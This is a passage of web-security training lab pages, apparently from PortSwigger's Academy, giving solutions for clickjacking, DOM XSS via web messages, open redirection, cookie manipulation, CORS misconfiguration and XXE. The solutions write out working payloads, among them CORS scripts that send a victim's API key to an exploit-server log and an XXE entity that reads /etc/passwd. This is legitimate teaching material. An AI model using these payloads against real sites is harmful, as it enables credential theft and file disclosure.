                the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need
                to use two elements for this lab.
            </p>
            <p>
                You can log in to the account yourself using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="highlightedarea">
                <h4>
                    Note
                </h4>
                <p>
                    The victim will be using Chrome so test your exploit on that browser.
                </p>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/5b7dc27b9539ec5079973204aadb5f58a9a78906b0a16bf6af46ca0407ada9a2?referrer=%2fweb-security%2fclickjacking%2flab-multistep"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in to your account on the target website and go to the user account page.
                                </li>
                                <li>
                                    <p>
                                        Go to the exploit server and paste the following HTML template into the "Body"
                                        section:
                                    </p>
                                    <code class="code-scrollable">
        &lt;style&gt;
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
Â  Â .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
Â  Â .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
&lt;/style&gt;
&lt;div class="firstClick"&gt;Test me first&lt;/div&gt;
&lt;div class="secondClick"&gt;Test me next&lt;/div&gt;
&lt;iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"&gt;&lt;/iframe&gt;
       </code>
                                </li>
                                <li>
                                    Make the following adjustments to the template:
                                    <ul>
                                        <li>
                                            Replace
                                            <code>
          YOUR-LAB-ID
         </code>
                                            with your unique lab ID so that URL points to the target website's user
                                            account page.
                                        </li>
                                        <li>
                                            Substitute suitable pixel values for the
                                            <code>
          $width_value
         </code>
                                            and
                                            <code>
          $height_value
         </code>
                                            variables of the iframe (we suggest 500px and 700px respectively).
                                        </li>
                                        <li>
                                            Substitute suitable pixel values for the
                                            <code>
          $top_value1
         </code>
                                            and
                                            <code>
          $side_value1
         </code>
                                            variables of the decoy web content so that the "Delete account" button and
                                            the "Test me first" decoy action align (we suggest 330px and 50px
                                            respectively).
                                        </li>
                                        <li>
                                            Substitute a suitable value for the
                                            <code>
          $top_value2
         </code>
                                            and
                                            <code>
          $side_value2
         </code>
                                            variables so that the "Test me next" decoy action aligns with the "Yes"
                                            button on the confirmation page (we suggest 285px and 225px respectively).
                                        </li>
                                        <li>
                                            Set the opacity value
                                            <code>
          $opacity
         </code>
                                            to ensure that the target iframe is transparent. Initially, use an opacity
                                            of 0.1 so that you can align the iframe actions and adjust the position
                                            values as necessary. For the submitted attack a value of 0.0001 will work.
                                        </li>
                                    </ul>
                                </li>
                                <li>
                                    Click
                                    <strong>
                                        Store
                                    </strong>
                                    and then
                                    <strong>
                                        View exploit
                                    </strong>
                                    .
                                </li>
                                <li>
                                    Hover over "Test me first" and ensure the cursor changes to a hand indicating that
                                    the div element is positioned correctly. If not, adjust the position of the div
                                    element by modifying the top and left properties inside the
                                    <code>
        firstClick
       </code>
                                    class of the style sheet.
                                </li>
                                <li>
                                    Click
                                    <strong>
                                        Test me first
                                    </strong>
                                    then hover over
                                    <strong>
                                        Test me next
                                    </strong>
                                    and ensure the cursor changes to a hand indicating that the div element is
                                    positioned correctly. If not, adjust the position of the div element by modifying
                                    the top and left properties inside the
                                    <code>
        secondClick
       </code>
                                    class of the style sheet.
                                </li>
                                <li>
                                    Once you have the div element lined up correctly, change "Test me first" to "Click
                                    me first", "Test me next" to "Click me next" and click
                                    <strong>
                                        Store
                                    </strong>
                                    on the exploit server.
                                </li>
                                <li>
                                    Now click on
                                    <strong>
                                        Deliver exploit to victim
                                    </strong>
                                    and the lab should be solved.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                using web messages
                (dom-based)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab demonstrates a simple web message vulnerability. To solve this lab, use the exploit server to
                post a message to the target site that causes the
                <code>
   print()
  </code>
                function to be called.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/ce814bae27379e097e9d714cfb763781f05932d2b95c2b194386687a89f6e2ac?referrer=%2fweb-security%2fdom-based%2fcontrolling-the-web-message-source%2flab-dom-xss-using-web-messages"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Notice that the home page contains an
                                    <code>
        addEventListener()
       </code>
                                    call that listens for a web message.
                                </li>
                                <li>
                                    <p>
                                        Go to the exploit server and add the following
                                        <code>
         iframe
        </code>
                                        to the body. Remember to add your own lab ID:
                                    </p>
                                    <code class="code-scrollable">
        &lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('&lt;img src=1 onerror=print()&gt;','*')"&gt;
       </code>
                                </li>
                                <li>
                                    Store the exploit and deliver it to the victim.
                                </li>
                            </ol>
                            <p>
                                When the
                                <code>
       iframe
      </code>
                                loads, the
                                <code>
       postMessage()
      </code>
                                method sends a web message to the home page. The event listener, which is intended to
                                serve ads, takes the content of the web message and inserts it into the
                                <code>
       div
      </code>
                                with the ID
                                <code>
       ads
      </code>
                                . However, in this case it inserts our
                                <code>
       img
      </code>
                                tag, which contains an invalid
                                <code>
       src
      </code>
                                attribute. This throws an error, which causes the
                                <code>
       onerror
      </code>
                                event handler to execute our payload.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                using web messages and a JavaScript URL
                (dom-based)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab demonstrates a DOM-based redirection vulnerability that is triggered by web messaging. To solve
                this lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the
                <code>
   print()
  </code>
                function.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/887f00fbadc4a46fc79d4827ebd012b3ba4d52ba2fef5b09a0a8b9a30a42a6de?referrer=%2fweb-security%2fdom-based%2fcontrolling-the-web-message-source%2flab-dom-xss-using-web-messages-and-a-javascript-url"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Notice that the home page contains an
                                    <code>
        addEventListener()
       </code>
                                    call that listens for a web message. The JavaScript contains a flawed
                                    <code>
        indexOf()
       </code>
                                    check that looks for the strings
                                    <code>
        "http:"
       </code>
                                    or
                                    <code>
        "https:"
       </code>
                                    anywhere within the web message. It also contains the sink
                                    <code>
        location.href
       </code>
                                    .
                                </li>
                                <li>
                                    <p>
                                        Go to the exploit server and add the following
                                        <code>
         iframe
        </code>
                                        to the body, remembering to replace
                                        <code>
         YOUR-LAB-ID
        </code>
                                        with your lab ID:
                                    </p>
                                    <code class="code-scrollable">
        &lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"&gt;
       </code>
                                </li>
                                <li>
                                    Store the exploit and deliver it to the victim.
                                </li>
                            </ol>
                            <p>
                                This script sends a web message containing an arbitrary JavaScript payload, along with
                                the string
                                <code>
       "http:"
      </code>
                                . The second argument specifies that any
                                <code>
       targetOrigin
      </code>
                                is allowed for the web message.
                            </p>
                            <p>
                                When the
                                <code>
       iframe
      </code>
                                loads, the
                                <code>
       postMessage()
      </code>
                                method sends the JavaScript payload to the main page. The event listener spots the
                                <code>
       "http:"
      </code>
                                string and proceeds to send the payload to the
                                <code>
       location.href
      </code>
                                sink, where the
                                <code>
       print()
      </code>
                                function is called.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">
                    DOM XSS
                </a>
                using web messages and
                <code>
   JSON.parse
  </code>
                (dom-based)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on
                the exploit server that exploits this vulnerability and calls the
                <code>
   print()
  </code>
                function.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/912c5f0d3d0d2905771da05ad007fd099d6fcd364cf93d4a3b855d2d64bdcaac?referrer=%2fweb-security%2fdom-based%2fcontrolling-the-web-message-source%2flab-dom-xss-using-web-messages-and-json-parse"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Notice that the home page contains an event listener that listens for a web message.
                                    This event listener expects a string that is parsed using
                                    <code>
        JSON.parse()
       </code>
                                    . In the JavaScript, we can see that the event listener expects a
                                    <code>
        type
       </code>
                                    property and that the
                                    <code>
        load-channel
       </code>
                                    case of the
                                    <code>
        switch
       </code>
                                    statement changes the
                                    <code>
        iframe src
       </code>
                                    attribute.
                                </li>
                                <li>
                                    <p>
                                        Go to the exploit server and add the following
                                        <code>
         iframe
        </code>
                                        to the body, remembering to replace
                                        <code>
         YOUR-LAB-ID
        </code>
                                        with your lab ID:
                                    </p>
                                    <code class="code-scrollable">
        &lt;iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'&gt;
       </code>
                                </li>
                                <li>
                                    Store the exploit and deliver it to the victim.
                                </li>
                            </ol>
                            <p>
                                When the
                                <code>
       iframe
      </code>
                                we constructed loads, the
                                <code>
       postMessage()
      </code>
                                method sends a web message to the home page with the type
                                <code>
       load-channel
      </code>
                                . The event listener receives the message and parses it using
                                <code>
       JSON.parse()
      </code>
                                before sending it to the
                                <code>
       switch
      </code>
                                .
                            </p>
                            <p>
                                The
                                <code>
       switch
      </code>
                                triggers the
                                <code>
       load-channel
      </code>
                                case, which assigns the
                                <code>
       url
      </code>
                                property of the message to the
                                <code>
       src
      </code>
                                attribute of the
                                <code>
       ACMEplayer.element
      </code>
                                <code>
       iframe
      </code>
                                . However, in this case, the
                                <code>
       url
      </code>
                                property of the message actually contains our JavaScript payload.
                            </p>
                            <p>
                                As the second argument specifies that any
                                <code>
       targetOrigin
      </code>
                                is allowed for the web message, and the event handler does not contain any form of
                                origin check, the payload is set as the
                                <code>
       src
      </code>
                                of the
                                <code>
       ACMEplayer.element
      </code>
                                <code>
       iframe
      </code>
                                . The
                                <code>
       print()
      </code>
                                function is called when the victim loads the page in their browser.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/dom-based/open-redirection">
                    DOM-based open redirection
                </a>
                (dom-based)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a DOM-based open-redirection vulnerability. To solve this lab, exploit this
                vulnerability and redirect the victim to the exploit server.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/67ab900d88bcd094478d14d157338de5bf87302c124c802219a8ef29a4a65e0f?referrer=%2fweb-security%2fdom-based%2fopen-redirection%2flab-dom-open-redirection"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                The blog post page contains the following link, which returns to the home page of the
                                blog:
                            </p>
                            <code class="code-scrollable">
      &lt;a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'&gt;Back to Blog&lt;/a&gt;
     </code>
                            <p>
                                The
                                <code>
       url
      </code>
                                parameter contains an open redirection vulnerability that allows you to change where the
                                "Back to Blog" link takes the user. To solve the lab, construct and visit the following
                                URL, remembering to change the URL to contain your lab ID and your exploit server ID:
                            </p>
                            <code class="code-scrollable">
      https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&amp;url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/
     </code>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/dom-based/cookie-manipulation">
                    DOM-based cookie manipulation
                </a>
                (dom-based)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab demonstrates DOM-based client-side cookie manipulation. To solve this lab, inject a cookie that
                will cause
                <a href="https://portswigger.net/web-security/cross-site-scripting">
                    XSS
                </a>
                on a different page and call the
                <code>
   print()
  </code>
                function. You will need to use the exploit server to direct the victim to the correct pages.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/a248974a24dd4abd637f526afb96bb349d49b2ad790756b97c46f47203781c6a?referrer=%2fweb-security%2fdom-based%2fcookie-manipulation%2flab-dom-cookie-manipulation"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Notice that the home page uses a client-side cookie called
                                    <code>
        lastViewedProduct
       </code>
                                    , whose value is the URL of the last product page that the user visited.
                                </li>
                                <li>
                                    <p>
                                        Go to the exploit server and add the following
                                        <code>
         iframe
        </code>
                                        to the body, remembering to replace
                                        <code>
         YOUR-LAB-ID
        </code>
                                        with your lab ID:
                                    </p>
                                    <code class="code-scrollable">
        &lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&amp;'&gt;&lt;script&gt;print()&lt;/script&gt;" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;"&gt;
       </code>
                                </li>
                                <li>
                                    Store the exploit and deliver it to the victim.
                                </li>
                            </ol>
                            <p>
                                The original source of the
                                <code>
       iframe
      </code>
                                matches the URL of one of the product pages, except there is a JavaScript payload added
                                to the end. When the
                                <code>
       iframe
      </code>
                                loads for the first time, the browser temporarily opens the malicious URL, which is then
                                saved as the value of the
                                <code>
       lastViewedProduct
      </code>
                                cookie. The
                                <code>
       onload
      </code>
                                event handler ensures that the victim is then immediately redirected to the home page,
                                unaware that this manipulation ever took place. While the victim's browser has the
                                poisoned cookie saved, loading the home page will cause the payload to execute.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: CORS vulnerability with basic origin reflection
                (cors)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This website has an insecure
                <a href="https://portswigger.net/web-security/cors">
                    CORS
                </a>
                configuration in that it trusts all origins.
            </p>
            <p>
                To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and
                upload the code to your exploit server. The lab is solved when you successfully submit the
                administrator's API key.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/3c3123251c8faea3353dafdf70678f6d9241bbcdda2f8772ce17fb4dee20ca0d?referrer=%2fweb-security%2fcors%2flab-basic-origin-reflection-attack"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Check intercept is off, then use the browser to log in and access your account page.
                                </li>
                                <li>
                                    Review the history and observe that your key is retrieved via an AJAX request to
                                    <code>
        /accountDetails
       </code>
                                    , and the response contains the
                                    <code>
        Access-Control-Allow-Credentials
       </code>
                                    header suggesting that it may support CORS.
                                </li>
                                <li>
                                    <p>
                                        Send the request to Burp Repeater, and resubmit it with the added header:
                                    </p>
                                    <code class="code-scrollable">
        Origin: https://example.com
       </code>
                                </li>
                                <li>
                                    Observe that the origin is reflected in the
                                    <code no-keyword-injection="">
        Access-Control-Allow-Origin
       </code>
                                    header.
                                </li>
                                <li>
                                    <p>
                                        In the browser, go to the exploit server and enter the following HTML, replacing
                                        <code>
         YOUR-LAB-ID
        </code>
                                        with your unique lab URL:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    Click
                                    <strong>
                                        View exploit
                                    </strong>
                                    . Observe that the exploit works - you have landed on the log page and your API key
                                    is in the URL.
                                </li>
                                <li>
                                    Go back to the exploit server and click
                                    <strong>
                                        Deliver exploit to victim
                                    </strong>
                                    .
                                </li>
                                <li>
                                    Click
                                    <strong>
                                        Access log
                                    </strong>
                                    , retrieve and submit the victim's API key to complete the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: CORS vulnerability with trusted null origin
                (cors)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This website has an insecure
                <a href="https://portswigger.net/web-security/cors">
                    CORS
                </a>
                configuration in that it trusts the "null" origin.
            </p>
            <p>
                To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and
                upload the code to your exploit server. The lab is solved when you successfully submit the
                administrator's API key.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/9d294029d336d1a8cefb9d84577fc92304467e91f4f9918e74b50be2c561db79?referrer=%2fweb-security%2fcors%2flab-null-origin-whitelisted-attack"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Check intercept is off, then use Burp's browser to log in to your account. Click "My
                                    account".
                                </li>
                                <li>
                                    Review the history and observe that your key is retrieved via an AJAX request to
                                    <code>
        /accountDetails
       </code>
                                    , and the response contains the
                                    <code>
        Access-Control-Allow-Credentials
       </code>
                                    header suggesting that it may support CORS.
                                </li>
                                <li>
                                    Send the request to Burp Repeater, and resubmit it with the added header
                                    <code>
        Origin: null.
       </code>
                                </li>
                                <li>
                                    Observe that the "null" origin is reflected in the
                                    <code>
        <a href="https://portswigger.net/web-security/cors/access-control-allow-origin">
         Access-Control-Allow-Origin
        </a>
       </code>
                                    header.
                                </li>
                                <li>
                                    <p>
                                        In the browser, go to the exploit server and enter the following HTML, replacing
                                        <code>
         YOUR-LAB-ID
        </code>
                                        with the URL for your unique lab URL and
                                        <code>
         YOUR-EXPLOIT-SERVER-ID
        </code>
                                        with the exploit server ID:
                                    </p>
                                    <code class="code-scrollable">
        &lt;iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="&lt;script&gt;
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
&lt;/script&gt;"&gt;&lt;/iframe&gt;
       </code>
                                    <p>
                                        Notice the use of an iframe sandbox as this generates a null origin request.
                                    </p>
                                </li>
                                <li>
                                    Click "View exploit". Observe that the exploit works - you have landed on the log
                                    page and your API key is in the URL.
                                </li>
                                <li>
                                    Go back to the exploit server and click "Deliver exploit to victim".
                                </li>
                                <li>
                                    Click "Access log", retrieve and submit the victim's API key to complete the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: CORS vulnerability with trusted insecure protocols
                (cors)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This website has an insecure
                <a href="https://portswigger.net/web-security/cors">
                    CORS
                </a>
                configuration in that it trusts all subdomains regardless of the protocol.
            </p>
            <p>
                To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and
                upload the code to your exploit server. The lab is solved when you successfully submit the
                administrator's API key.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-erlenmeyer">
                            </span>
                            Hint
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <p>
                                If you could man-in-the-middle attack (MITM) the victim, you could use a MITM attack to
                                hijack a connection to an insecure subdomain, and inject malicious JavaScript to exploit
                                the CORS configuration. Unfortunately in the lab environment, you can't MITM the victim,
                                so you'll need to find an alternative way of injecting JavaScript into the subdomain.
                            </p>
                        </div>
                    </div>
                </details>
            </div>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/c2f3d400e6fb00bebe61e8dca6a98b25a66613b18da83b2279298634c46d7f8e?referrer=%2fweb-security%2fcors%2flab-breaking-https-attack"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Check intercept is off, then use Burp's browser to log in and access your account
                                    page.
                                </li>
                                <li>
                                    Review the history and observe that your key is retrieved via an AJAX request to
                                    <code>
        /accountDetails
       </code>
                                    , and the response contains the
                                    <code>
        Access-Control-Allow-Credentials
       </code>
                                    header suggesting that it may support CORS.
                                </li>
                                <li>
                                    Send the request to Burp Repeater, and resubmit it with the added header
                                    <code>
        Origin: http://subdomain.lab-id
       </code>
                                    where
                                    <code>
        lab-id
       </code>
                                    is the lab domain name.
                                </li>
                                <li>
                                    Observe that the origin is reflected in the
                                    <code>
        <a href="https://portswigger.net/web-security/cors/access-control-allow-origin">
         Access-Control-Allow-Origin
        </a>
       </code>
                                    header, confirming that the CORS configuration allows access from arbitrary
                                    subdomains, both HTTPS and HTTP.
                                </li>
                                <li>
                                    Open a product page, click
                                    <strong>
                                        Check stock
                                    </strong>
                                    and observe that it is loaded using a HTTP URL on a subdomain.
                                </li>
                                <li>
                                    Observe that the
                                    <code>
        productID
       </code>
                                    parameter is vulnerable to
                                    <a href="https://portswigger.net/web-security/cross-site-scripting">
                                        XSS
                                    </a>
                                    .
                                </li>
                                <li>
                                    <p>
                                        In the browser, go to the exploit server and enter the following HTML, replacing
                                        <code>
         YOUR-LAB-ID
        </code>
                                        with your unique lab URL and
                                        <code>
         YOUR-EXPLOIT-SERVER-ID
        </code>
                                        with your exploit server ID:
                                    </p>
                                    <code class="code-scrollable">
        &lt;script&gt;
    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4&lt;script&gt;var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script&gt;&amp;storeId=1"
&lt;/script&gt;
       </code>
                                </li>
                                <li>
                                    Click
                                    <strong>
                                        View exploit
                                    </strong>
                                    . Observe that the exploit works - you have landed on the log page and your API key
                                    is in the URL.
                                </li>
                                <li>
                                    Go back to the exploit server and click
                                    <strong>
                                        Deliver exploit to victim
                                    </strong>
                                    .
                                </li>
                                <li>
                                    Click
                                    <strong>
                                        Access log
                                    </strong>
                                    , retrieve and submit the victim's API key to complete the lab.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting
                <a href="https://portswigger.net/web-security/xxe">
                    XXE
                </a>
                using external entities to retrieve files
                (xxe)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the
                response.
            </p>
            <p>
                To solve the lab, inject an XML external entity to retrieve the contents of the
                <code>
   /etc/passwd
  </code>
                file.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/96a4274d6672c286187a77cc2a99f9342b37c04786b8c9e88a91bd9759d3e7d4?referrer=%2fweb-security%2fxxe%2flab-exploiting-xxe-to-retrieve-files"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Visit a product page, click "Check stock", and intercept the resulting POST request
                                    in Burp Suite.
                                </li>
                                <li>
                                    <p>
                                        Insert the following external entity definition in between the XML declaration
                                        and the
                                        <code>
         stockCheck
        </code>
                                        element:
                                    </p>
                                    <code class="code-scrollable">
        &lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; ]&gt;
       </code>
                                </li>
                                <li>
                                    Replace the
                                    <code>
        productId
       </code>
                                    number with a reference to the external entity:
                                    <code>
        &amp;xxe;
       </code>
                                    . The response should contain "Invalid product ID:" followed by the contents of the
                                    <code>
        /etc/passwd
       </code>
                                    file.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Exploiting XXE to perform SSRF attacks
                (xxe)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the
                response.
            </p>
            <p>
                The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is
                <code>
   http://169.254.169.254/
  </code>
                . This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
            </p>
            <p>
                To solve the lab, exploit the
                <a href="https://portswigger.net/web-security/xxe">
                    XXE
